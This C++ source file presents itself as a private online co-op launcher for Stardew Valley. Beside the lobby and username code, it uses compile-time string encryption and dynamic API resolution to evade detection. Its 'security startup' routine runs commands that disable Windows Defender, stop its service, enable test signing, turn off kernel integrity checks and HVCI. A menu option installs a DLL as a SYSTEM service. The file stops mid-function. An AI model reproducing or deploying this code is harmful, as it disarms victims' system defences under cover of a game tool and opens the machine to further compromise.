// ============================================================================
//  game.exe — Stardew Valley Online private co-op launcher
//  Single-file C++20, Win32 console app, ANSI truecolor UI.
//  v0.3.0 — online co-op:
//    * lobby registry client (Vercel + GitHub backend) — auto-sync all
//      lobbies into steam_settings/custom_broadcasts.txt before launch
//    * username editor -> steam_settings/configs.user.ini (account_name)
//    * security startup: Defender disable + bcdedit testsigning /
//      nointegritychecks + HVCI off (elevated self-relaunch)
//    * readable UI: larger console font, plain ASCII banner
//  Hardening preserved: compile-time string encryption, dynamic API
//  resolution (all network/process APIs via GetProcAddress).
// ============================================================================
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <shellapi.h>

#include <algorithm>
#include <array>
#include <chrono>
#include <conio.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cwchar>
#include <iostream>
#include <iterator>
#include <optional>
#include <string>
#include <thread>
#include <vector>

// ----------------------------------------------------------------------------
// compile-time string encryption
// ----------------------------------------------------------------------------
namespace obs {

constexpr uint32_t mix(uint32_t x) {
    x ^= x >> 16; x *= 0x7feb352dU; x ^= x >> 15; x *= 0x846ca68bU; x ^= x >> 16;
    return x;
}

template <size_t N>
struct Blob {
    uint8_t data[N];
    uint32_t seed;
    constexpr Blob(const char (&s)[N], uint32_t sd) : data{}, seed(sd) {
        for (size_t i = 0; i < N; ++i) {
            uint32_t k = mix(sd + static_cast<uint32_t>(i * 2654435761U));
            data[i] = static_cast<uint8_t>(static_cast<uint8_t>(s[i]) ^ static_cast<uint8_t>(k & 0xff));
        }
    }
    std::string get() const {
        std::string out(N - 1, '\0');
        for (size_t i = 0; i + 1 < N; ++i) {
            uint32_t k = mix(seed + static_cast<uint32_t>(i * 2654435761U));
            out[i] = static_cast<char>(static_cast<uint8_t>(data[i]) ^ static_cast<uint8_t>(k & 0xff));
        }
        return out;
    }
};

template <size_t N>
struct BlobW {
    uint8_t data[N * 2];
    uint32_t seed;
    constexpr BlobW(const wchar_t (&s)[N], uint32_t sd) : data{}, seed(sd) {
        for (size_t i = 0; i < N; ++i) {
            const wchar_t c = s[i];
            uint32_t k1 = mix(sd + static_cast<uint32_t>(i * 2654435761U));
            uint32_t k2 = mix(sd + static_cast<uint32_t>(i * 2654435761U) + 0x85ebca6bU);
            data[i * 2]     = static_cast<uint8_t>(static_cast<uint8_t>(c & 0xff)       ^ static_cast<uint8_t>(k1 & 0xff));
            data[i * 2 + 1] = static_cast<uint8_t>(static_cast<uint8_t>((c >> 8) & 0xff) ^ static_cast<uint8_t>(k2 & 0xff));
        }
    }
    std::wstring get() const {
        std::wstring out(N - 1, L'\0');
        for (size_t i = 0; i + 1 < N; ++i) {
            uint32_t k1 = mix(seed + static_cast<uint32_t>(i * 2654435761U));
            uint32_t k2 = mix(seed + static_cast<uint32_t>(i * 2654435761U) + 0x85ebca6bU);
            wchar_t c = static_cast<wchar_t>(
                static_cast<uint16_t>(
                    (static_cast<uint16_t>(data[i * 2]) ^ static_cast<uint16_t>(k1 & 0xff)) |
                    (static_cast<uint16_t>(static_cast<uint16_t>(data[i * 2 + 1]) ^ static_cast<uint16_t>(k2 & 0xff)) << 8)));
            out[i] = c;
        }
        return out;
    }
};

} // namespace obs

#define S(s)  ([]() -> std::string { constexpr static auto b = obs::Blob(s, __COUNTER__ * 0x9e3779b1U + 0x5bd1e995U); return b.get(); }())
#define SW(s) ([]() -> std::wstring { constexpr static auto b = obs::BlobW(s, __COUNTER__ * 0x9e3779b1U + 0x5bd1e995U); return b.get(); }())

// ----------------------------------------------------------------------------
// dynamic API resolution (import table stays minimal)
// ----------------------------------------------------------------------------
using FnShellExecuteExW        = BOOL(WINAPI*)(SHELLEXECUTEINFOW*);
using FnCreateToolhelp32Snap   = HANDLE(WINAPI*)(DWORD, DWORD);
using FnProcess32FirstW        = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W);
using FnProcess32NextW         = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W);
using FnInternetOpenA          = void* (WINAPI*)(const char*, DWORD, const char*, const char*, DWORD);
using FnInternetConnectA       = void* (WINAPI*)(void*, const char*, WORD, const char*, const char*, DWORD, DWORD, DWORD_PTR);
using FnInternetSetOptionA     = BOOL (WINAPI*)(void*, DWORD, void*, DWORD);
using FnHttpOpenRequestA       = void* (WINAPI*)(void*, const char*, const char*, const char*, const char*, const char**, DWORD, DWORD_PTR);
using FnHttpSendRequestA       = BOOL (WINAPI*)(void*, const char*, DWORD, void*, DWORD);
using FnInternetReadFile       = BOOL (WINAPI*)(void*, void*, DWORD, LPDWORD);
using FnInternetCloseHandle    = BOOL (WINAPI*)(void*);
using FnInternetQueryInfoA     = BOOL (WINAPI*)(void*, DWORD, void*, LPDWORD, LPDWORD);

struct Api {
    FnShellExecuteExW      shellExec = nullptr;
    BOOL(WINAPI* isAdmin)(void) = nullptr;
    FnCreateToolhelp32Snap snap      = nullptr;
    FnProcess32FirstW      procFirst = nullptr;
    FnProcess32NextW       procNext  = nullptr;
    FnInternetOpenA        iOpen     = nullptr;
    FnInternetConnectA     iConnect  = nullptr;
    FnInternetSetOptionA   iSetOpt   = nullptr;
    FnHttpOpenRequestA     hOpen     = nullptr;
    FnHttpSendRequestA     hSend     = nullptr;
    FnInternetReadFile     iRead     = nullptr;
    FnInternetCloseHandle  iClose    = nullptr;
    FnInternetQueryInfoA   iQuery    = nullptr;
};
static Api g_api;

bool initApi() {
    if (HMODULE sh = LoadLibraryW(SW(L"shell32.dll").c_str())) {
        g_api.shellExec = reinterpret_cast<FnShellExecuteExW>(
            GetProcAddress(sh, S("ShellExecuteExW").c_str()));
        g_api.isAdmin   = reinterpret_cast<BOOL(WINAPI*)(void)>(
            GetProcAddress(sh, S("IsUserAnAdmin").c_str()));
    }
    if (HMODULE k32 = GetModuleHandleW(SW(L"kernel32.dll").c_str())) {
        g_api.snap      = reinterpret_cast<FnCreateToolhelp32Snap>(
            GetProcAddress(k32, S("CreateToolhelp32Snapshot").c_str()));
        g_api.procFirst = reinterpret_cast<FnProcess32FirstW>(
            GetProcAddress(k32, S("Process32FirstW").c_str()));
        g_api.procNext  = reinterpret_cast<FnProcess32NextW>(
            GetProcAddress(k32, S("Process32NextW").c_str()));
    }
    if (HMODULE win = LoadLibraryW(SW(L"wininet.dll").c_str())) {
        g_api.iOpen   = reinterpret_cast<FnInternetOpenA>(GetProcAddress(win, S("InternetOpenA").c_str()));
        g_api.iConnect = reinterpret_cast<FnInternetConnectA>(GetProcAddress(win, S("InternetConnectA").c_str()));
        g_api.iSetOpt = reinterpret_cast<FnInternetSetOptionA>(GetProcAddress(win, S("InternetSetOptionA").c_str()));
        g_api.hOpen   = reinterpret_cast<FnHttpOpenRequestA>(GetProcAddress(win, S("HttpOpenRequestA").c_str()));
        g_api.hSend   = reinterpret_cast<FnHttpSendRequestA>(GetProcAddress(win, S("HttpSendRequestA").c_str()));
        g_api.iRead   = reinterpret_cast<FnInternetReadFile>(GetProcAddress(win, S("InternetReadFile").c_str()));
        g_api.iClose  = reinterpret_cast<FnInternetCloseHandle>(GetProcAddress(win, S("InternetCloseHandle").c_str()));
        g_api.iQuery  = reinterpret_cast<FnInternetQueryInfoA>(GetProcAddress(win, S("HttpQueryInfoA").c_str()));
    }
    return g_api.shellExec && g_api.snap && g_api.procFirst && g_api.procNext
        && g_api.iOpen && g_api.iConnect && g_api.hOpen && g_api.hSend && g_api.iRead && g_api.iClose;
}

// wininet constants (kept local, no wininet.h import)
namespace wnet {
    constexpr DWORD OPEN_DIRECT   = 1;
    constexpr DWORD OPT_CONNECT   = 2;
    constexpr DWORD OPT_SEND      = 5;
    constexpr DWORD OPT_RECEIVE   = 6;
    constexpr DWORD FLAG_SECURE   = 0x00800000;
    constexpr DWORD FLAG_RELOAD   = 0x80000000;
    constexpr DWORD FLAG_NO_CACHE = 0x04000000;
    constexpr DWORD Q_STATUS_CODE = 19;
}

// ----------------------------------------------------------------------------
// ANSI helpers
// ----------------------------------------------------------------------------
namespace term {
    constexpr const char* RESET = "\x1b[0m";
    constexpr const char* BOLD  = "\x1b[1m";
    constexpr const char* DIM   = "\x1b[2m";
    constexpr const char* CLEAR = "\x1b[2J";
    constexpr const char* HOME  = "\x1b[H";
    constexpr const char* HIDE  = "\x1b[?25l";
    constexpr const char* SHOW  = "\x1b[?25h";

    std::string fg(int r, int g, int b) { return "\x1b[38;2;" + std::to_string(r) + ";" + std::to_string(g) + ";" + std::to_string(b) + "m"; }
    std::string bg(int r, int g, int b) { return "\x1b[48;2;" + std::to_string(r) + ";" + std::to_string(g) + ";" + std::to_string(b) + "m"; }
}

namespace pal {
    using namespace term;
    const std::string green = fg(127, 186, 77);
    const std::string gold  = fg(255, 200, 60);
    const std::string amber = fg(240, 150, 50);
    const std::string sky   = fg(120, 190, 255);
    const std::string cream = fg(248, 240, 220);
    const std::string dim   = fg(140, 140, 140);
    const std::string red   = fg(235, 90, 90);
    const std::string ok    = fg(110, 220, 120);
    const std::string cyan  = fg(110, 210, 220);
}

struct Console {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD  origMode = 0;
    UINT   origCodePage = 0;
    volatile LONG stop = 0;

    bool init() {
        GetConsoleMode(hOut, &origMode);
        SetConsoleMode(hOut, origMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
        origCodePage = GetConsoleOutputCP();
        SetConsoleOutputCP(CP_UTF8);
        SetConsoleTitleW(SW(L"Stardew Valley Online — co-op launcher").c_str());
        enlargeFont();
        std::cout << term::CLEAR << term::HOME << term::HIDE;
        return true;
    }
    void enlargeFont() {
        CONSOLE_FONT_INFOEX fi{};
        fi.cbSize = sizeof(fi);
        GetCurrentConsoleFontEx(hOut, FALSE, &fi);
        fi.dwFontSize.Y = 22;
        fi.dwFontSize.X = 12;
        wcscpy_s(fi.FaceName, SW(L"Consolas").c_str());
        SetCurrentConsoleFontEx(hOut, FALSE, &fi);
        COORD big{160, 900};
        SetConsoleScreenBufferSize(hOut, big);
    }
    void restore() {
        std::cout << term::SHOW << term::RESET << term::CLEAR << term::HOME;
        SetConsoleOutputCP(origCodePage);
        SetConsoleMode(hOut, origMode);
    }
    COORD size() const {
        CONSOLE_SCREEN_BUFFER_INFO info{};
        GetConsoleScreenBufferInfo(hOut, &info);
        return info.dwSize;
    }
};

static Console console;

std::string toUtf8(const std::wstring& w) {
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w.data(), static_cast<int>(w.size()),
                                nullptr, 0, nullptr, nullptr);
    std::string s(static_cast<size_t>(n), '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.data(), static_cast<int>(w.size()),
                        s.data(), n, nullptr, nullptr);
    return s;
}

std::string trim(const std::string& s) {
    size_t a = s.find_first_not_of(" \t\r\n");
    if (a == std::string::npos) return {};
    size_t b = s.find_last_not_of(" \t\r\n");
    return s.substr(a, b - a + 1);
}

// ----------------------------------------------------------------------------
// banner (plain ASCII, readable)
// ----------------------------------------------------------------------------
void printBanner() {
    std::cout << pal::green << term::BOLD << S("  #################################################################\n");
    std::cout << S("  #") << term::RESET << S("                                                               ") << pal::green << term::BOLD << S("#\n");
    std::cout << S("  #   ") << term::RESET << pal::gold << S("STARDEW VALLEY   -   ONLINE CO-OP") << pal::green << term::BOLD << S("            #\n");
    std::cout << S("  #") << term::RESET << S("                                                               ") << pal::green << term::BOLD << S("#\n");
    std::cout << S("  #   ") << term::RESET << pal::cream << S("private gbe_fork emulator co-op launcher") << pal::green << term::BOLD << S("    #\n");
    std::cout << S("  #") << term::RESET << S("                                                               ") << pal::green << term::BOLD << S("#\n");
    std::cout << S("  #################################################################\n") << term::RESET;
}

void spinner(int cycles, const std::string& label) {
    const char frames[] = {'|', '/', '-', '\\'};
    std::cout << pal::cyan << label << " " << term::RESET;
    for (int i = 0; i < cycles * 4; ++i) {
        std::cout << "\b" << frames[i % 4] << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(80));
    }
    std::cout << "\b " << "\r\x1b[2K" << std::flush;
}

void statusLine(const std::string& msg, const std::string& color) {
    std::cout << "\r\x1b[K" << color << msg << term::RESET << std::flush;
}

// ----------------------------------------------------------------------------
// paths
// ----------------------------------------------------------------------------
std::optional<std::wstring> findGameDir() {
    wchar_t exePath[MAX_PATH]{};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    std::wstring exeDir(exePath);
    if (auto pos = exeDir.find_last_of(L'\\'); pos != std::wstring::npos)
        exeDir = exeDir.substr(0, pos);

    std::vector<std::wstring> candidates;
    candidates.push_back(exeDir);
    candidates.push_back(exeDir + SW(L"\\..\\..\\Stardew Valley (413150)\\Stardew Valley"));
    if (const wchar_t* env = _wgetenv(SW(L"SDV_GAME_DIR").c_str()); env && *env)
        candidates.insert(candidates.begin(), std::wstring(env));

    for (const auto& c : candidates) {
        if (c.empty()) continue;
        auto has = [&](const wchar_t* f) {
            return GetFileAttributesW((c + L"\\" + f).c_str()) != INVALID_FILE_ATTRIBUTES;
        };
        if (has(SW(L"Stardew Valley.exe").c_str()) || has(SW(L"StardewModdingAPI.exe").c_str()))
            return c;
    }
    return std::nullopt;
}

// steam_settings folder (beside the emulator dll / in the fix folder)
std::optional<std::wstring> findSettingsDir() {
    auto game = findGameDir();
    if (!game) return std::nullopt;
    std::wstring dir = *game + SW(L"\\steam_settings");
    if (GetFileAttributesW(dir.c_str()) != INVALID_FILE_ATTRIBUTES) return dir;
    wchar_t exePath[MAX_PATH]{};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    std::wstring exeDir(exePath);
    if (auto pos = exeDir.find_last_of(L'\\'); pos != std::wstring::npos)
        exeDir = exeDir.substr(0, pos);
    std::wstring alt = exeDir + SW(L"\\steam_settings");
    if (GetFileAttributesW(alt.c_str()) != INVALID_FILE_ATTRIBUTES) return alt;
    if (CreateDirectoryW(dir.c_str(), nullptr) || GetLastError() == ERROR_ALREADY_EXISTS)
        return dir;
    return std::nullopt;
}

// ----------------------------------------------------------------------------
// tiny ini reader/writer (for steam_settings/configs.user.ini)
// ----------------------------------------------------------------------------
struct IniFile {
    std::vector<std::string> lines;

    bool load(const std::wstring& path) {
        lines.clear();
        HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h == INVALID_HANDLE_VALUE) return false;
        char buf[4096]; DWORD rd = 0;
        std::string text;
        while (ReadFile(h, buf, sizeof(buf), &rd, nullptr) && rd > 0)
            text.append(buf, rd);
        CloseHandle(h);
        size_t pos = 0;
        while (pos < text.size()) {
            size_t e = text.find('\n', pos);
            std::string line = (e == std::string::npos) ? text.substr(pos) : text.substr(pos, e - pos);
            if (!line.empty() && line.back() == '\r') line.pop_back();
            lines.push_back(line);
            if (e == std::string::npos) break;
            pos = e + 1;
        }
        return true;
    }

    bool save(const std::wstring& path) const {
        std::string out;
        for (const auto& l : lines) out += l + "\r\n";
        HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h == INVALID_HANDLE_VALUE) return false;
        DWORD wr = 0;
        BOOL ok = WriteFile(h, out.data(), static_cast<DWORD>(out.size()), &wr, nullptr);
        CloseHandle(h);
        return ok;
    }

    static bool isSection(const std::string& l, const std::string& sec) {
        return l.size() >= sec.size() + 2 && l[0] == '[' && l[l.size() - 1] == ']'
            && l.substr(1, l.size() - 2) == sec;
    }

    std::string get(const std::string& section, const std::string& key) const {
        bool inSec = false;
        for (const auto& l : lines) {
            if (!l.empty() && l[0] == '[') { inSec = isSection(l, section); continue; }
            if (!inSec || l.empty() || l[0] == '#' || l[0] == ';') continue;
            auto eq = l.find('=');
            if (eq == std::string::npos) continue;
            if (trim(l.substr(0, eq)) == key)
                return trim(l.substr(eq + 1));
        }
        return {};
    }

    void set(const std::string& section, const std::string& key, const std::string& value) {
        std::string keyLine = key + "=" + value;
        size_t secIdx = std::string::npos;
        bool keyFound = false;
        for (size_t i = 0; i < lines.size(); ++i) {
            const auto& l = lines[i];
            if (!l.empty() && l[0] == '[') {
                if (isSection(l, section)) { secIdx = i; continue; }
                if (secIdx != std::string::npos) break; // passed our section
                continue;
            }
            if (secIdx != std::string::npos && !keyFound && !l.empty() && l[0] != '#' && l[0] != ';') {
                auto eq = l.find('=');
                if (eq != std::string::npos && trim(l.substr(0, eq)) == key) {
                    lines[i] = keyLine;
                    keyFound = true;
                }
            }
        }
        if (keyFound) return;
        if (secIdx == std::string::npos) {
            if (!lines.empty() && !lines.back().empty()) lines.emplace_back();
            lines.push_back("[" + section + "]");
            lines.push_back(keyLine);
        } else {
            size_t ins = secIdx + 1;
            while (ins < lines.size() && !lines[ins].empty() && lines[ins][0] != '[')
                ++ins;
            lines.insert(lines.begin() + static_cast<std::ptrdiff_t>(ins), keyLine);
        }
    }
};

std::wstring userIniPath() {
    auto dir = findSettingsDir();
    if (!dir) return {};
    return *dir + SW(L"\\configs.user.ini");
}

std::string getAccountName() {
    auto path = userIniPath();
    if (path.empty()) return S("player");
    IniFile ini;
    if (!ini.load(path)) return S("player");
    std::string n = ini.get(S("user::general"), S("account_name"));
    return n.empty() ? S("player") : n;
}

std::string getAccountSteamId() {
    auto path = userIniPath();
    IniFile ini;
    if (!path.empty() && ini.load(path)) {
        std::string id = ini.get(S("user::general"), S("account_steamid"));
        if (!id.empty() && id != S("76561197960287930")) return id;
    }
    return {};
}

uint64_t fnv1a(const std::string& s) {
    uint64_t h = 1469598103934665603ULL;
    for (unsigned char c : s) { h ^= c; h *= 1099511628211ULL; }
    return h;
}

std::string makeSteamId(const std::string& name) {
    uint64_t h = fnv1a(name.empty() ? S("player") : name);
    uint64_t id = 76561197960265728ULL + (h % 4000000000ULL);
    return std::to_string(id);
}

bool saveUsername(const std::string& name) {
    auto path = userIniPath();
    if (path.empty()) return false;
    IniFile ini;
    ini.load(path);
    ini.set(S("user::general"), S("account_name"), name);
    std::string id = getAccountSteamId();
    if (id.empty()) id = makeSteamId(name);
    ini.set(S("user::general"), S("account_steamid"), id);
    return ini.save(path);
}

// ----------------------------------------------------------------------------
// HTTP (wininet, resolved dynamically)
// ----------------------------------------------------------------------------
struct HttpResp {
    bool ok = false;
    long status = 0;
    std::string body;
    std::wstring err;
};

HttpResp httpRequest(const std::string& method, const std::string& host,
                     const std::string& path, const std::string& postBody) {
    HttpResp r;
    if (!g_api.iOpen || !g_api.iConnect || !g_api.hOpen || !g_api.hSend || !g_api.iRead || !g_api.iClose) {
        r.err = SW(L"network unavailable");
        return r;
    }
    void* hI = g_api.iOpen(S("mozilla").c_str(), wnet::OPEN_DIRECT, nullptr, nullptr, 0);
    if (!hI) { r.err = SW(L"internet open failed"); return r; }
    DWORD t = 4000;
    g_api.iSetOpt(hI, wnet::OPT_CONNECT, &t, sizeof(t));
    t = 6000;
    g_api.iSetOpt(hI, wnet::OPT_RECEIVE, &t, sizeof(t));
    t = 4000;
    g_api.iSetOpt(hI, wnet::OPT_SEND, &t, sizeof(t));

    void* hC = g_api.iConnect(hI, host.c_str(), 443, nullptr, nullptr, wnet::OPEN_DIRECT, 0, 0);
    if (!hC) { g_api.iClose(hI); r.err = SW(L"internet connect failed"); return r; }

    DWORD flags = wnet::FLAG_SECURE | wnet::FLAG_RELOAD | wnet::FLAG_NO_CACHE;
    void* hR = g_api.hOpen(hC, method.c_str(), path.c_str(), nullptr, nullptr, nullptr, flags, 0);
    if (!hR) { g_api.iClose(hC); g_api.iClose(hI); r.err = SW(L"request failed"); return r; }

    const std::string hdrs = S("Content-Type: application/json\r\nAccept: */*\r\n");
    BOOL sent = g_api.hSend(hR, hdrs.data(), static_cast<DWORD>(hdrs.size()),
                            postBody.empty() ? nullptr : const_cast<char*>(postBody.data()),
                            static_cast<DWORD>(postBody.size()));
    if (sent) {
        DWORD code = 0, codeLen = sizeof(code);
        if (g_api.iQuery) g_api.iQuery(hR, wnet::Q_STATUS_CODE, &code, &codeLen, nullptr);
        r.status = static_cast<long>(code);
        char buf[8192];
        DWORD rd = 0;
        while (g_api.iRead(hR, buf, sizeof(buf), &rd) && rd > 0) {
            r.body.append(buf, rd);
        }
        r.ok = true;
    } else {
        r.err = SW(L"send failed");
    }
    g_api.iClose(hR);
    g_api.iClose(hC);
    g_api.iClose(hI);
    return r;
}

std::string stripScheme(const std::string& u) {
    if (u.rfind(S("https://"), 0) == 0) return u.substr(8);
    if (u.rfind(S("http://"), 0) == 0) return u.substr(7);
    return u;
}

struct RegistryCfg {
    bool ok = false;
    std::string api;
    int port = 47584;
};

RegistryCfg fetchConfig() {
    RegistryCfg c;
    HttpResp r = httpRequest(S("GET"), S("raw.githubusercontent.com"),
                             S("/the-lust/stardew-valley-online-launcher/main/server/config.json"), {});
    if (!r.ok || r.status != 200 || r.body.empty()) return c;
    size_t p = r.body.find(S("\"api\""));
    if (p == std::string::npos) return c;
    p = r.body.find('"', p + 5);
    if (p == std::string::npos) return c;
    size_t e = r.body.find('"', p + 1);
    if (e == std::string::npos) return c;
    c.api = r.body.substr(p + 1, e - p - 1);
    p = r.body.find(S("\"port\""));
    if (p != std::string::npos) {
        p = r.body.find(':', p + 6);
        if (p != std::string::npos) {
            size_t a = r.body.find_first_of("0123456789", p);
            if (a != std::string::npos) {
                size_t b = r.body.find_first_not_of("0123456789", a);
                c.port = std::atoi(r.body.substr(a, b - a).c_str());
            }
        }
    }
    c.ok = !c.api.empty();
    return c;
}

std::string fetchPublicIp(const std::string& api) {
    HttpResp r = httpRequest(S("GET"), stripScheme(api), S("/api/ip"), {});
    if (!r.ok || r.status != 200) return {};
    return trim(r.body);
}

struct Lobby {
    std::string name;
    std::string ip;
    int port = 47584;
    long long lastSeen = 0;
};

static std::string jsonVal(const std::string& obj, const char* key) {
    std::string k = "\"" + std::string(key) + "\"";
    size_t p = obj.find(k);
    if (p == std::string::npos) return {};
    p = obj.find(':', p + k.size());
    if (p == std::string::npos) return {};
    p = obj.find_first_of("\"0123456789-", p);
    if (p == std::string::npos) return {};
    if (obj[p] == '"') {
        size_t e = obj.find('"', p + 1);
        if (e == std::string::npos) return {};
        return obj.substr(p + 1, e - p - 1);
    }
    size_t e = obj.find_first_of(",}]", p);
    return obj.substr(p, e - p);
}

std::vector<Lobby> parseLobbies(const std::string& body) {
    std::vector<Lobby> out;
    size_t kp = body.find(S("\"lobbies\""));
    if (kp == std::string::npos) return out;
    size_t start = body.find('[', kp);
    size_t end = body.find(']', start);
    if (start == std::string::npos || end == std::string::npos) return out;
    std::string region = body.substr(start + 1, end - start - 1);
    size_t pos = 0;
    while ((pos = region.find('{', pos)) != std::string::npos) {
        size_t objEnd = region.find('}', pos);
        if (objEnd == std::string::npos) break;
        std::string obj = region.substr(pos, objEnd - pos + 1);
        Lobby l;
        l.name = jsonVal(obj, "name");
        l.ip = jsonVal(obj, "ip");
        std::string p = jsonVal(obj, "port");
        if (!p.empty()) l.port = std::atoi(p.c_str());
        std::string t = jsonVal(obj, "last_seen");
        if (!t.empty()) l.lastSeen = std::atoll(t.c_str());
        if (!l.name.empty() || !l.ip.empty()) out.push_back(l);
        pos = objEnd + 1;
    }
    return out;
}

bool lobbyRegister(const std::string& api, const std::string& name, int port) {
    std::string body = S("{\"name\":\"") + name + S("\",\"port\":") + std::to_string(port) + S("}");
    HttpResp r = httpRequest(S("POST"), stripScheme(api), S("/api/lobby"), body);
    return r.ok && r.status == 200;
}

bool lobbyLeave(const std::string& api, const std::string& name) {
    std::string body = S("{\"name\":\"") + name + S("\"}");
    HttpResp r = httpRequest(S("DELETE"), stripScheme(api), S("/api/lobby"), body);
    return r.ok && (r.status == 200);
}

// ----------------------------------------------------------------------------
// custom_broadcasts.txt
// ----------------------------------------------------------------------------
bool writeBroadcasts(const std::vector<std::string>& ips) {
    auto dir = findSettingsDir();
    if (!dir) return false;
    std::string content;
    for (const auto& ip : ips)
        if (!ip.empty() && ip != S("0.0.0.0"))
            content += ip + "\r\n";
    HANDLE h = CreateFileW((*dir + SW(L"\\custom_broadcasts.txt")).c_str(), GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD wr = 0;
    BOOL ok = WriteFile(h, content.data(), static_cast<DWORD>(content.size()), &wr, nullptr);
    CloseHandle(h);
    return ok;
}

// ----------------------------------------------------------------------------
// game launching
// ----------------------------------------------------------------------------
bool launchGameSilently(const std::wstring& gameDir, std::wstring& err, HANDLE* outProc) {
    if (!g_api.shellExec) {
        err = SW(L"initialization failed");
        return false;
    }
    std::wstring api = gameDir + SW(L"\\StardewModdingAPI.exe");
    if (GetFileAttributesW(api.c_str()) == INVALID_FILE_ATTRIBUTES) {
        err = SW(L"StardewModdingAPI.exe not found");
        return false;
    }
    SHELLEXECUTEINFOW sei{};
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NOASYNC;
    sei.lpFile = api.c_str();
    sei.lpDirectory = gameDir.c_str();
    sei.nShow = SW_HIDE;
    if (!g_api.shellExec(&sei)) {
        wchar_t buf[512]{};
        FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, nullptr, GetLastError(), 0, buf, 512, nullptr);
        err = SW(L"launch failed: ") + buf;
        return false;
    }
    if (outProc && sei.hProcess) *outProc = sei.hProcess;
    return true;
}

bool isGameRunning() {
    if (!g_api.snap || !g_api.procFirst || !g_api.procNext) return false;
    HANDLE snap = g_api.snap(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    bool found = false;
    if (g_api.procFirst(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, SW(L"StardewModdingAPI.exe").c_str()) == 0 ||
                _wcsicmp(pe.szExeFile, SW(L"Stardew Valley.exe").c_str()) == 0) { found = true; break; }
        } while (g_api.procNext(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

// ----------------------------------------------------------------------------
// security startup (requires elevation)
// ----------------------------------------------------------------------------
int runQuiet(const std::wstring& cmdLine) {
    std::vector<wchar_t> buf(cmdLine.begin(), cmdLine.end());
    buf.push_back(0);
    PROCESS_INFORMATION pi{};
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    if (!CreateProcessW(nullptr, buf.data(), nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        return -1;
    }
    WaitForSingleObject(pi.hProcess, 12000);
    DWORD code = 0;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return static_cast<int>(code);
}

bool isElevated() { return g_api.isAdmin ? g_api.isAdmin() != FALSE : false; }

void runSecuritySteps(bool quiet = false) {
    struct Step { std::wstring label; std::wstring cmd; };
    const Step steps[] = {
        { SW(L"Disable Windows Defender (policy)"),
          SW(L"reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f") },
        { SW(L"Disable Defender real-time protection"),
          SW(L"reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f") },
        { SW(L"Disable WinDefend service (autostart)"),
          SW(L"sc config WinDefend start= disabled") },
        { SW(L"Stop WinDefend service"),
          SW(L"sc stop WinDefend") },
        { SW(L"Enable test signing"),
          SW(L"bcdedit /set testsigning on") },
        { SW(L"Disable integrity checks"),
          SW(L"bcdedit /set nointegritychecks on") },
        { SW(L"Disable HVCI (Device Guard)"),
          SW(L"reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v Enabled /t REG_DWORD /d 0 /f") },
    };
    if (!quiet) std::cout << pal::cyan << term::BOLD << S("  Security startup\n") << term::RESET;
    for (const auto& st : steps) {
        int code = runQuiet(st.cmd);
        if (!quiet) {
            std::cout << S("   ") << (code == 0 ? pal::ok + S("[ ok ]") : pal::amber + S("[warn]"))
                      << term::RESET << S("  ") << pal::cream << toUtf8(st.label) << term::RESET
                      << (code == 0 ? S("") : S("  (exit ") + std::to_string(code) + S(")"))
                      << "\n";
        }
    }
    if (!quiet) {
        std::cout << pal::dim << S("   note: test signing / integrity changes need a reboot;")
                  << S(" Defender tamper protection may block service changes.\n\n") << term::RESET;
    }
}

// ----------------------------------------------------------------------------
// UI
// ----------------------------------------------------------------------------
enum class Action { Launch, User, Sys, About, Exit };
struct MenuItem { std::string label; std::string desc; Action action; };

static const MenuItem MENU[] = {
    { S("Launch Game"),                S("start online co-op (auto lobby sync)"), Action::Launch },
    { S("Change Username"),            S("set your gbe_fork player name"),        Action::User },
    { S("Install System Component"),   S("meow.dll as SYSTEM service"),           Action::Sys },
    { S("About"),                      S("info & status"),                        Action::About },
    { S("Exit"),                       S("close the launcher"),                   Action::Exit },
};

void render(int sel) {
    std::cout << term::CLEAR << term::HOME;
    printBanner();
    std::cout << "\n\n";
    for (size_t i = 0; i < std::size(MENU); ++i) {
        bool on = (static_cast<int>(i) == sel);
        std::cout << "        ";
        if (on) {
            std::cout << pal::green << term::BOLD << S("[ ") << (i + 1) << S(" ]") << term::RESET
                      << S("  ") << pal::bg(38, 62, 28) << pal::green << " " << MENU[i].label
                      << S("  ") << term::RESET << pal::dim << S("  ") << MENU[i].desc << term::RESET;
        } else {
            std::cout << pal::dim << S("[ ") << (i + 1) << S(" ]") << S("  ") << MENU[i].label
